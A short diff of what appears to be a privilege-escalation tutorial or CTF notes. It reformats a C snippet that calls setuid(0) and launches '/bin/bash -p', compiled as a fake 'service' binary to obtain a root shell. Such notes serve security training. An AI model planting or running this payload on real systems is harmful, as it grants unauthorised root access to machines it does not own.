@@ -185,8 +185,9 @@ void_init(){
   - Create a script in C. 
   ```C
   int main() {
-  	setuid(0);
-	system("/bin/bash -p");
+        setuid(0);
+        system("/bin/bash -p");
+  }
   ```
 - Make it executable
   - `gcc -o service service.c`
